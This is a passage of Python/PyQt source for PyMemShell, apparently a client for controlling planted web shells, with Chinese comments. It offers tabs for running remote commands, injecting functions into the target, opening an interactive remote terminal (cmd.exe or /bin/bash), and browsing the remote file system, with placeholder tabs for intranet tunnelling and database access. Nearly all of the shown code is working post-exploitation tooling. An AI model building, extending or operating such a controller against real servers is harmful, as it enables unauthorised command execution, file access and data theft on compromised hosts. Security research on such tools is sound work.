        if node_path in self.item_info and 'dir' in self.item_info[node_path] and not flag:
            pass
        else:
            if not self.injectStaus:
                self.fileMsgLable.setText('[*] 函数未注入')
            else:
                payload = FileManage['dir']
                payload = payload.replace('$path$', str(node_path))
                url = self.main_window.url_input.text().strip()
                password = self.main_window.password_input.text().strip()
                json_data = basic_info(payload=payload, url=url, password=password)
                if json_data is not None:
                    if 'status' in json_data and json_data['status'] == 'success':
                        directory_details = json_data['msg']
                        if node_path not in self.item_info:
                            self.item_info[node_path] = dict()
                        # 这里区分刷新动作和点击动作 刷新的时候是已经有了节点 所以删除更新要覆盖掉item
                        # 如果是点击事件 这里就是添加节点需要为节点添加记录
                        if flag:
                            self.delete_all_children(self.item_info[node_path]['item'])
                            item = self.item_info[node_path]['item']
                        else:
                            self.item_info[node_path]['item'] = item
                        self.item_info[node_path]['dir'] = directory_details
                        for directory in directory_details:
                            if directory['is_directory']:
                                child = self.add_tree_child(parent=item, child_name=directory['name'])
                                # 将子节点也添加到item_info中
                                if self.main_window.os_shell.lower() == 'windows':
                                    self.item_info[str(node_path + directory['name'] + '\\\\')] = dict()
                                    self.item_info[str(node_path + directory['name'] + '\\\\')]['item'] = child
                                else:
                                    self.item_info[str(node_path + directory['name'] + '/')] = dict()
                                    self.item_info[str(node_path + directory['name'] + '/')]['item'] = child
                else:
                    self.fileMsgLable.setText('[*] 异常查看日志')
        self.filePathLineEdit.setText(node_path.replace('\\\\', '\\'))
        item_dir = dict()
        item_dir['dir'] = self.item_info[node_path]['dir']
        item_dir['node_path'] = node_path
        self.table.initData(item_dir)

    def initData(self):
        if len(self.get_tree_structure()) == 0:
            self.filePathLineEdit.setText(self.main_window.current_path_root)
            if self.main_window.os_shell.lower() == 'windows':
                self.device_info = self.main_window.disk_info
            else:
                self.device_info = [{'device': '/'}]

            for disk in self.device_info:
                root = self.add_tree_root(disk['device'])
                if self.main_window.os_shell.lower() == 'windows':
                    self.item_info[disk['device'].replace('\\', '\\\\')] = {'item': root}
                else:
                    self.item_info[disk['device']] = {'item': root}
            # 注入文件操作的函数
            try:
                # 注入函数操作
                payload = FileManage['injectFunc']
                url = self.main_window.url_input.text().strip()
                password = self.main_window.password_input.text().strip()
                json_data = basic_info(payload=payload, url=url, password=password)
                if 'status' in json_data and json_data['status'] == 'success':
                    self.fileMsgLable.setText('[*] 函数注入成功')
                    self.fileMsgLable.setStyleSheet('color: green')
                    self.injectStaus = True
                else:
                    self.fileMsgLable.setText('[*] 函数注入失败')
                    self.fileMsgLable.setStyleSheet('color: red')
                    self.injectStaus = False
            except Exception as e:
                logger.exception('[MainUI.TreeTableFileManage.initData] ' + str(e))
                self.fileMsgLable.setText('[*] 异常' + str(e))
                self.fileMsgLable.setStyleSheet('color: red')


class MainWindow(QMainWindow):
    """ 主窗口 """

    def __init__(self):
        super().__init__()
        self.setWindowTitle('PyMemShell')
        self.status = False
        self.current_path_root = None
        # 设置窗口图标
        setIcon(self)
        self.resize(1177, 664)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        main_layout = QVBoxLayout()
        central_widget.setLayout(main_layout)

        # URL 密码
        input_layout = QHBoxLayout()

        # URL label和输入
        url_label = QLabel("URL:")
        url_label.setFont(QFont("Arial", 12))
        url_label.setFixedHeight(30)
        url_label.setStyleSheet("padding-right: 10px;")
        input_layout.addWidget(url_label)

        self.url_input = QLineEdit()
        self.url_input.setFont(QFont("Arial", 12, QFont.Bold))
        self.url_input.setFixedHeight(40)
        self.url_input.setText('http://127.0.0.1:5000/shell')
        self.url_input.setStyleSheet("""
                                QLineEdit {
                                    border: 1px solid #3E3E3E;
                                    border-radius: 5px;
                                    padding: 5px;
                                    font-size: 18px; padding: 2px;
                                }
                                QLineEdit:focus {
                                    border-color: #0078D7;
                                }
                                """)
        input_layout.addWidget(self.url_input)

        # 密码 label和输入
        password_label = QLabel("密码:")
        password_label.setFont(QFont("Arial", 12))
        input_layout.addWidget(password_label)

        self.password_input = QLineEdit()
        self.password_input.setText('pass')
        self.password_input.setFont(QFont("Arial", 12))
        self.password_input.setFixedHeight(40)
        self.password_input.setFixedWidth(200)
        self.password_input.setStyleSheet("""
                                QLineEdit {
                                    border: 1px solid #3E3E3E;
                                    border-radius: 5px;
                                    padding: 5px;
                                    font-size: 18px; padding: 2px;
                                }
                                QLineEdit:focus {
                                    border-color: #0078D7;
                                }
                                """)
        input_layout.addWidget(self.password_input)

        # 连接按钮
        self.reconnect_button = QPushButton("重新连接")
        self.reconnect_button.setFont(QFont("Arial", 12))
        self.reconnect_button.setFixedHeight(40)
        self.reconnect_button.setStyleSheet("padding: 5px 15px; margin-left: 20px;")
        input_layout.addWidget(self.reconnect_button)
        # 将按钮的点击信号连接到槽函数
        self.reconnect_button.clicked.connect(self.connect_button_clicked)

        main_layout.addLayout(input_layout)

        # Tab Bar
        self.tabs = QTabWidget()
        main_layout.addWidget(self.tabs)

        # 基本信息tab====================================================================================================
        self.basic_info_tab = QWidget()
        self.tabs.addTab(self.basic_info_tab, "基本信息")
        self.basic_info_layout = QHBoxLayout()
        self.basic_info_tab.setLayout(self.basic_info_layout)

        self.basic_info_edit = QTextEdit()
        self.basic_info_edit.setReadOnly(True)
        self.basic_info_edit.setHtml('')
        self.basic_info_edit.setFont(QFont("Arial", 14))
        self.basic_info_refresh_button = QPushButton("刷新")
        self.basic_info_refresh_button.setFont(QFont("Arial", 12))
        self.basic_info_refresh_button.setFixedHeight(40)
        self.basic_info_refresh_button.setStyleSheet("padding: 5px 15px; margin-left: 20px;")
        # 将按钮的点击信号连接到槽函数
        self.basic_info_refresh_button.clicked.connect(self.connect_button_clicked)

        self.basic_info_layout.addWidget(self.basic_info_edit)
        self.basic_info_layout.addWidget(self.basic_info_refresh_button)

        """ 
        # 命令执行tab====================================================================================================
        """
        self.exec_command_tab = QWidget()
        self.tabs.addTab(self.exec_command_tab, "命令执行")

        self.exec_command_layout = QVBoxLayout()

        self.terminalOutput = QTextEdit()
        self.terminalOutput.setStyleSheet("""
                    background-color: #2E2E2E;
                    color: #FFFFFF;
                    border: 1px solid #3E3E3E;
                    padding: 10px;
                    border-radius: 5px;
                """)
        self.terminalOutput.setFont(QFont("Cascadia", 12))
        self.terminalOutput.setAcceptRichText(False)
        self.terminalOutput.setCursorWidth(2)
        self.terminalOutput.setFocus()
        self.terminalOutput.setReadOnly(True)
        self.prompt = '/> '  # 命令行样式
        self.exec_command_tab.setLayout(self.exec_command_layout)

        inputLayout = QHBoxLayout()

        # 命令执行模式
        # self.inputLabel = QLabel("[Command]: ")
        # self.inputLabel.setFont(QFont("Arial", 12))
        self.commandComboBox = QComboBox()
        self.commandComboBox.addItems(CMD.keys())
        self.commandComboBox.setFont(QFont("Arial", 12))
        self.commandComboBox.setStyleSheet("""
                    QComboBox {
                        border: 1px solid #3E3E3E;
                        border-radius: 5px;
                        padding: 5px;
                    }
                    QComboBox:focus {
                        border-color: #0078D7;
                    }
                """)
        self.inputLineEdit = QLineEdit()
        self.inputLineEdit.setPlaceholderText("Enter command and press Enter")
        self.inputLineEdit.setFixedHeight(40)
        self.inputLineEdit.setFont(QFont("Arial", 14))
        self.inputLineEdit.setStyleSheet("""
                    QLineEdit {
                        border: 1px solid #3E3E3E;
                        border-radius: 5px;
                        padding: 5px;
                        font-size: 18px; padding: 2px;
                    }
                    QLineEdit:focus {
                        border-color: #0078D7;
                    }
                """)
        self.inputLineButton = QPushButton("执行")
        self.inputLineButton.setFont(QFont("Arial", 12))
        self.inputLineButton.setFixedHeight(40)
        self.inputLineButton.setStyleSheet("""
                    QPushButton {
                        background-color: #0078D7;
                        color: white;
                        padding: 5px 15px;
                        border-radius: 5px;
                        margin-left: 20px;
                    }
                    QPushButton:hover {
                        background-color: #005BB5;
                    }
                    QPushButton:pressed {
                        background-color: #003E8C;
                    }
                """)
        # inputLayout.addWidget(self.inputLabel)
        inputLayout.addWidget(self.commandComboBox)
        inputLayout.addWidget(self.inputLineEdit)
        inputLayout.addWidget(self.inputLineButton)

        self.exec_command_layout.addWidget(self.terminalOutput)  # 添加命令回显输出
        self.exec_command_layout.addLayout(inputLayout)  # 添加命令输入框布局到面板布局

        # 命令输入回车信号
        self.inputLineEdit.returnPressed.connect(self.executeCommand)
        # 将按钮的点击信号连接到槽函数
        self.inputLineButton.clicked.connect(self.executeCommand)

        """ 
        虚拟终端tab====================================================================================================
        """
        self.virtual_terminal_tab = QWidget()
        self.tabs.addTab(self.virtual_terminal_tab, "虚拟终端")
        # tab的布局
        self.virtual_terminal_tab_layout = QVBoxLayout()
        self.virtual_terminal_tab.setLayout(self.virtual_terminal_tab_layout)  # 设置布局

        # binPath布局
        binPathLayout = QHBoxLayout()
        self.binPathLabel = QLabel("可执行文件路径:")
        self.binPathLabel.setFont(QFont("Arial", 10))

        self.binPathLineEdit = QLineEdit()
        self.binPathLineEdit.setPlaceholderText("可执行文件路径")
        self.binPathLineEdit.setFixedHeight(30)
        self.binPathLineEdit.setFixedHeight(30)
        self.binPathLineEdit.setFont(QFont("Arial", 14))
        self.binPathLineEdit.setStyleSheet("""
                            QLineEdit {
                                border: 1px solid #3E3E3E;
                                border-radius: 5px;
                                padding: 5px;
                                font-size: 18px; padding: 2px;
                            }
                            QLineEdit:focus {
                                border-color: #0078D7;
                            }
                        """)

        self.timeDelayLabel = QLabel("延迟(ms)")
        self.timeDelayLabel.setFont(QFont("Arial", 10))
        self.timeDelayLabel.setFixedHeight(30)
        self.timeDelayLineEdit = QLineEdit()
        self.timeDelayLineEdit.setPlaceholderText("ms")
        self.timeDelayLineEdit.setFixedHeight(30)
        self.timeDelayLineEdit.setFixedWidth(100)
        self.timeDelayLineEdit.setFont(QFont("Arial", 14))
        self.timeDelayLineEdit.setStyleSheet("""
                                    QLineEdit {
                                        border: 1px solid #3E3E3E;
                                        border-radius: 5px;
                                        padding: 5px;
                                        font-size: 18px; padding: 2px;
                                    }
                                    QLineEdit:focus {
                                        border-color: #0078D7;
                                    }
                                """)

        self.binPathButton = QPushButton("启动")
        self.binPathButton.setFont(QFont("Arial", 12))
        self.binPathButton.setFixedHeight(30)
        self.binPathButton.setStyleSheet("""
                            QPushButton {
                                background-color: green;
                                color: white;
                                padding: 5px 15px;
                                border-radius: 5px;
                                margin-left: 20px;
                            }
                            QPushButton:hover {
                                background-color: #005BB5;
                            }
                            QPushButton:pressed {
                                background-color: #003E8C;
                            }
                        """)

        binPathLayout.addWidget(self.binPathLabel)
        binPathLayout.addWidget(self.binPathLineEdit)
        binPathLayout.addWidget(self.timeDelayLabel)
        binPathLayout.addWidget(self.timeDelayLineEdit)
        binPathLayout.addWidget(self.binPathButton)

        # 添加binPath到tab
        self.virtual_terminal_tab_layout.addLayout(binPathLayout)
        # 终端布局
        self.virtual_terminal_panel = VirtualTerminal()
        self.virtual_terminal_panel.setStyleSheet("background-color: black; color: Lime;")
        self.virtual_terminal_panel.setFont(QFont('Courier', 12))
        # 添加终端到tab
        self.virtual_terminal_tab_layout.addWidget(self.virtual_terminal_panel)

        self.vtMsgLabel = QLabel("MSG:")
        self.vtMsgLabel.setFont(QFont("Arial", 10))
        self.vtMsgLabel.setFixedHeight(25)
        self.virtual_terminal_panel.setMsfLabel(self.vtMsgLabel)
        self.virtual_terminal_tab_layout.addWidget(self.vtMsgLabel)
        # 将按钮的点击信号连接到槽函数
        self.binPathButton.clicked.connect(self.virtualTerminalEvent)

        """ 
        文件管理tab====================================================================================================
        """
        self.file_manage_tab = TreeTableFileManage(main_window=self)
        self.tabs.addTab(self.file_manage_tab, "文件管理")
        # 树表结构作为文件浏览器

        # ======================================
        # self.add_tab("虚拟终端")
        # self.add_tab("文件管理")
        self.add_tab("内网穿透")
        self.add_tab("数据库管理")
        self.add_tab("自定义代码")

        # 连接标签栏的点击事件
        self.tabs.tabBarClicked.connect(self.tab_clicked)

        # Menu bar
        self.menu_bar = self.menuBar()
        self.setMenuBar(self.menu_bar)
        self.menu_bar.setStyleSheet('color: green;font-size: 18px;font-weight bold; ')

        self.connection_status = QAction("已连接", self)
        self.connection_status.setText("已断开")
        # 创建操作（Action）
        self.open_link_action = QAction("关于", self)

        self.menu_bar.setStyleSheet('color: red;font-size: 18px')
        self.menu_bar.addAction(self.connection_status)
        self.menu_bar.addAction(self.open_link_action)
        # 连接操作到槽函数
        self.open_link_action.triggered.connect(self.open_link)
        self.apply_styles()
    def open_link(self):
        import webbrowser
        url = "https://github.com/orzchen/PyMemShell"
        webbrowser.open(url)
    def executeCommand(self):
        """ 命令执行槽函数 """
        if self.status:
            action_name = 'ExecCommand'
            url = self.url_input.text().strip()
            password = self.password_input.text().strip()
            command = self.inputLineEdit.text()
            self.terminalOutput.append(f"{self.prompt}{command}")
            # payload = getPayloadFileContent(action_name) # 获取payload
            # 使用下拉框可以方便扩展命令执行的方式 暂时写了三种 主要保证不同系统上的通用性
            payload = self.commandComboBox.currentText()
            payload = CMD[payload]
            # 执行命令拼接 确定目录 编码
            if self.os_shell.lower() == 'windows':
                # command = 'cmd /C ' + ' chcp 65001 ' + self.current_path[:2] + ' & cd ' + self.current_path + ' & ' + str(command) + ' & chdir'
                # command = self.current_path[:2] + ' & cd ' + self.current_path + ' & ' + str(command) + ' & chdir'
                # 盘符号 -  路径 - 命令 - 当前路径
                command = f'{self.current_path[:2]} & cd {self.current_path} & {str(command)}  & chdir'
            else:
                # command = 'bash -c ' + f'{command} ; pwd'
                command = f'cd {self.current_path} ; {command} ; pwd'
            # 替换模板
            payload = payload.replace("%command%", command).replace('%current_path%',
                                                                    str(self.current_path).replace('\\', '\\\\'))
            json_data = basic_info(payload, url, password)  # 没设计好，这个函数可以复用
            if json_data is not None:
                # self.terminalOutput.append(json_data['cmd'].splitlines()[:-1])
                # 拼接输出内容
                self.terminalOutput.append('\n'.join(json_data['cmd'].splitlines()[:-1]))
                self.current_path = json_data['current_path']
                # 输出界面的美化
                self.setCurrentPrompt()
            self.inputLineEdit.clear()

    def setCurrentPrompt(self):
        if self.os_shell.lower() == 'windows':
            self.prompt = self.current_path + '>'
        else:
            last_folder_name = os.path.basename(self.current_path)
            # if last_folder_name == self.user:
            if self.current_path == '/home/' + self.user:
                last_folder_name = '~'
            self.prompt = f"[{self.user}@{self.hostname} {last_folder_name}]# "
        self.terminalOutput.append(f"{self.prompt}")

    def virtualTerminalEvent(self):
        # 根据连接状态设置不同响应 连接断开
        if self.virtualTerminalConnectStatus is False:
            if self.binPathLineEdit.text() == '' or self.timeDelayLineEdit.text() == '':
                QMessageBox.critical(self, "错误", "输入可执行文件路径", QMessageBox.Yes | QMessageBox.No,
                                     QMessageBox.Yes)
                return None
            self.virtualTerminalConnectStatus = True
            self.binPathButton.setText('断开')
            self.binPathButton.setStyleSheet("""
                                       QPushButton {
                                           background-color: red;
                                           color: white;
                                           padding: 5px 15px;
                                           border-radius: 5px;
                                           margin-left: 20px;
                                       }
                                   """)
            self.current_path_exec = self.current_path
            self.current_path = self.current_path_root  # 还原当前路径
            self.setCurrentPrompt()
            self.vt_prompt = self.prompt
            self.current_path = self.current_path_exec  # 还原命令执行窗口路径
            self.setCurrentPrompt()
            # 设置虚拟终端路径
            self.virtual_terminal_panel.prompt_path = self.vt_prompt
            # 获取 binPath time
            self.virtual_terminal_panel.setBinPath(self.binPathLineEdit.text())
            self.virtual_terminal_panel.setTimeDelay(self.timeDelayLineEdit.text())
            url = self.url_input.text().strip()
            password = self.password_input.text().strip()
            ShellInfo = dict({'url': url, 'password': password, 'os': self.os_shell})
            self.virtual_terminal_panel.setShellInfo(ShellInfo)
            # 刷新一下
            self.virtual_terminal_panel.prompt()
            self.vtMsgLabel.setText('已连接')
            self.VirtualTerminalConnectStatus()
        elif self.virtualTerminalConnectStatus:
            self.virtualTerminalConnectStatus = False
            self.binPathButton.setText('启动')
            self.binPathButton.setStyleSheet("""
                                       QPushButton {
                                           background-color: green;
                                           color: white;
                                           padding: 5px 15px;
                                           border-radius: 5px;
                                           margin-left: 20px;
                                       }
                                   """)
            self.vtMsgLabel.setText('已断开连接')
            self.VirtualTerminalConnectStatus()

    def VirtualTerminalConnectStatus(self):
        """ 连接按钮点击事件处理 """
        url = self.url_input.text().strip()
        password = self.password_input.text().strip()
        binPath = self.binPathLineEdit.text().strip()
        try:
            # 启动为注入函数
            if self.virtualTerminalConnectStatus:
                payload = RealCMD['injectMainFunc']
                json_data = basic_info(payload, url, password)
                if json_data is not None:
                    if 'status' in json_data and json_data['status'] == 'success':
                        # 创建终端 执行binPath
                        task_id = ''
                        payload = RealCMD['createTerminal']
                        payload = payload.replace('$binPath$', binPath)
                        json_data_create = basic_info(payload, url, password)
                        if json_data_create is not None:
                            if 'status' in json_data_create and json_data_create['status'] == 'success':
                                task_id = json_data_create['task_id']
                                # time.sleep(3)
                                # self.virtual_terminal_panel.getCmdContent()
                        self.virtual_terminal_panel.runCommand(command='', init=True)
                        time.sleep(3)
                       
                        self.vtMsgLabel.setText('[*] 已连接 - 注入函数成功 - 程序PID ' + str(task_id))
                        self.vtMsgLabel.setStyleSheet("color: green")
            # 断开为结束进程
            elif self.virtualTerminalConnectStatus is False:
                self.virtual_terminal_panel.stop_threads = True  # 请求线程停止
                payload = RealCMD['stopTerminal']
                json_data = basic_info(payload, url, password)
                if json_data is not None:
                    if 'status' in json_data and json_data['status'] == 'stopped':
                        self.vtMsgLabel.setText('[*] 已断开 - 终止终端')
                        self.vtMsgLabel.setStyleSheet("color: red")
        except Exception as e:
            logger.exception('[MainUI.MainWindow.VirtualTerminalConnectStatus] ' + str(e))
            self.vtMsgLabel.setText('异常' + str(e))

    def tab_clicked(self, index):
        """ tab bar点击槽函数 """
        tab_text = self.tabs.tabText(index)
        # 命令执行 tab 事件
        if index == 1:
            if self.status:
                # 根据连接成功状态定义界面的输入框行为，加个刷新妈的
                self.inputLineEdit.setReadOnly(False)
                self.inputLineEdit.setPlaceholderText("Enter command and press Enter")
                if self.os_shell.lower() == 'windows':
                    self.prompt = self.current_path + '>'
                else:
                    last_folder_name = os.path.basename(self.current_path)
                    if last_folder_name == self.user:
                        last_folder_name = '~'
                    self.prompt = f"[{self.user}@{self.hostname} {last_folder_name}]# "
                self.terminalOutput.append(f"{self.prompt}")
            else:
                self.inputLineEdit.setReadOnly(True)
                self.inputLineEdit.setPlaceholderText("未连接状态")
                # QMessageBox.critical(self, "错误", "连接错误", QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)

        if index == 2:
            if self.status:
                self.binPathButton.setEnabled(True)
                self.binPathLineEdit.setReadOnly(False)
                self.timeDelayLineEdit.setReadOnly(False)
                self.virtual_terminal_panel.setReadOnly(False)
                # self.virtual_terminal_panel.clear()
                self.timeDelayVT = 500
                self.timeDelayLineEdit.setText(str(self.timeDelayVT))
                # 初始化虚拟终端的连接状态
                # if self.virtualTerminalConnectStatus is True: # bug
                if hasattr(self, 'virtualTerminalConnectStatus'):
                    pass
                else:
                    self.virtualTerminalConnectStatus = False
                if self.os_shell.lower() == 'windows':
                    self.binPathLineEdit.setText('cmd.exe')
                else:
                    self.binPathLineEdit.setText('/bin/bash')
            else:
                self.binPathButton.setEnabled(False)
                self.binPathLineEdit.setReadOnly(True)
                self.timeDelayLineEdit.setReadOnly(True)
                self.virtual_terminal_panel.append('/>')
                self.virtual_terminal_panel.setReadOnly(True)

        if index == 3:
            """ 文件浏览器 """

            if self.status:
                self.file_manage_tab.initData()
                self.file_manage_tab.filePathButton.setEnabled(True)
                self.file_manage_tab.filePathLineEdit.setReadOnly(False)

            else:
                self.file_manage_tab.filePathButton.setEnabled(False)
                self.file_manage_tab.filePathLineEdit.setReadOnly(True)

    def connect_button_clicked(self):
        """ 连接按钮槽函数 """
        action_name = 'BasicInfo'
        # 连接的时候获取基本信息
        if self.url_input.text() != '' and self.password_input.text() != '':
            url = self.url_input.text().strip()
            password = self.password_input.text().strip()
            payload = getPayloadFileContent(action_name)  # 读取文件获取Payload
            json_resp = basic_info(payload, url, password)
            if json_resp is not None:
                if 'success' in json_resp:
                    # 连接成功的状态 设置变量修改属性
                    self.status = True
                    self.current_path = json_resp['current_path']
                    # 设置root路径
                    if self.current_path_root is None:
                        self.current_path_root = self.current_path
                    self.os_shell = json_resp['os']
                    self.hostname = json_resp['hostname']
                    self.disk_info = json_resp['disk_info']
                    self.user = json_resp['current_user']['user']
                    self.connection_status.setText("已连接")
                    self.menu_bar.setStyleSheet('color: green;font-size: 18px')
                    html_content = generate_basic_info_html(json_resp)  # 不行搓UI了，上html
                    self.basic_info_edit.setHtml(html_content)
            else:
                QMessageBox.critical(self, "错误", "连接错误", QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
                self.connection_status.setText("已断开")
                self.menu_bar.setStyleSheet('color: red;font-size: 18px')

    def add_tab(self, name):
        tab = QWidget()
        self.tabs.addTab(tab, name)
        layout = QVBoxLayout()
        tab.setLayout(layout)
        placeholder_text_edit = QTextEdit()
        placeholder_text_edit.setFont(QFont("Arial", 12))
        layout.addWidget(placeholder_text_edit)

    def apply_styles(self):
        """ 主样式 """
        self.setStyleSheet("""
                    QTabWidget::pane { border: 0; }
                    QTabBar::tab { font-size: 14px; height: 30px; width: 120px; }
                    QTextEdit { font-size: 16px; }
                    QLineEdit { font-size: 14px; height: 30px; }
                    QPushButton { font-size: 14px; height: 40px; }
                    QTabWidget::pane { /* The tab widget frame */
                        border-top: 2px solid #C2C7CB;
                        position: absolute;
                        top: -0.5em;
                    }

                    QTabWidget::tab-bar {
                        alignment: center;
                    }

                    /* Style the tab using the tab sub-control. Note that
                        it reads QTabBar _not_ QTabWidget */
                    QTabBar::tab {
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                                    stop: 0 #E1E1E1, stop: 0.4 #DDDDDD,
                                                    stop: 0.5 #D8D8D8, stop: 1.0 #D3D3D3);
                        border: 2px solid #C4C4C3;
                        border-bottom-color: #C2C7CB; /* same as the pane color */
                        border-top-left-radius: 4px;
                        border-top-right-radius: 4px;
                        min-width: 8ex;
                        padding: 2px;
                    }
                    QTabBar::tab:selected, QTabBar::tab:hover {
                        background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1, stop: 0 #fafafa, stop: 0.4 #f4f4f4, stop: 0.5 #e7e7e7, stop: 1.0 #fafafa);
                    }
                    QTabBar::tab:selected {
                        border-color: #9B9B9B;
                        border-bottom-color: #C2C7CB; /* same as pane color */
                    }
                """)


def main():
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
